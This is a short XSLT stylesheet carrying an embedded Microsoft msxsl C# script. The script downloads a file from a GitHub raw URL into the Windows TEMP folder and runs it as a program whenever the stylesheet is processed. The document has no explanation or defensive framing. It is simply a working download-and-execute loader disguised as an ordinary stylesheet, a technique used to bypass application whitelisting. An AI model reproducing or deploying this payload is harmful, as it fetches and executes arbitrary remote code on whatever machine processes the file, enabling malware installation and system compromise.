<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
      xmlns:user="http://mycompany.com/mynamespace">
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
public string xml()
  {
            System.Net.WebClient client = new System.Net.WebClient();
            client.DownloadFile(@"https://raw.githubusercontent.com/legionx2022/ourtest/main/test.txt", @"C:\\windows\\TEMP\\test921.txt");
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = @"C:\\windows\\TEMP\\test921.txt";
            p.Start(); 
           return "hai";
 
  }
 
]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:xml()"/>
  </xsl:template>
</xsl:stylesheet>
